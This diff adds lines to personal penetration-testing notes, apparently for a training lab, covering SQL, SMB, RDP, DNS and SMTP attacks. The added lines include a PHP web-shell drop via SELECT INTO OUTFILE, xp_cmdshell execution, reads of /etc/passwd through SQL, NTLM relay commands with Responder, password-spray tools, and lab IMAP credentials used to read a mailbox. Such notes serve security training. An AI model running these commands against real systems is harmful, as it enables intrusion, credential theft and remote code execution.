@@ -31,6 +31,18 @@ Coss Platform:
 Enumerate acc pwd:
   https://learn.microsoft.com/en-us/sql/t-sql/statements/statements?view=sql-server-ver15
     https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15
+      1> xp_cmdshell 'whoami'
+      2> GO
+
+      mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+      1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+
+      1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+
+      mysql> select LOAD_FILE("/etc/passwd");
+
+      1> EXECUTE AS LOGIN = 'sa'
 
 FTP:
   passive
@@ -48,8 +60,47 @@ SMB:
     https://github.com/fortra/impacket/blob/master/examples/smbexec.py
     https://github.com/fortra/impacket/blob/master/examples/atexec.py
 
+
+RDP:
+  pwd spray with Hydra
+  
+
     middel man
       https://github.com/lgandx/Responder
          sudo responder -I ens33
+
       impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146      dump NTLM hashes
       impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'https://www.revshells.com'
+        sudo impacket-smbserver share ./ -smb2support
+
+
+DNS:
+  dig AXFR
+
+  https://github.com/projectdiscovery/subfinder
+
+  https://www.ettercap-project.org/
+
+  https://github.com/TheRook/subbrute
+
+
+SMTP:
+  telnet 10.10.110.20 port
+    VRFY, EXPN, RCPT TO
+
+  enum acc:
+    https://github.com/pentestmonkey/smtp-user-enum
+    https://github.com/0xZDH/o365spray
+
+  enum pwd:
+    Hydra
+    https://github.com/0xZDH/o365spray
+    https://github.com/dafthack/MailSniper
+    https://github.com/ustayready/CredKing
+
+  nmap -p 25 --script smtp-open-relay.nse IP
+
+  telnet STMIP 143
+  11 login "marlin@inlanefreight.htb" "poohbear"
+  12 select "INBOX"
+  13 FETCH 1 BODY[]
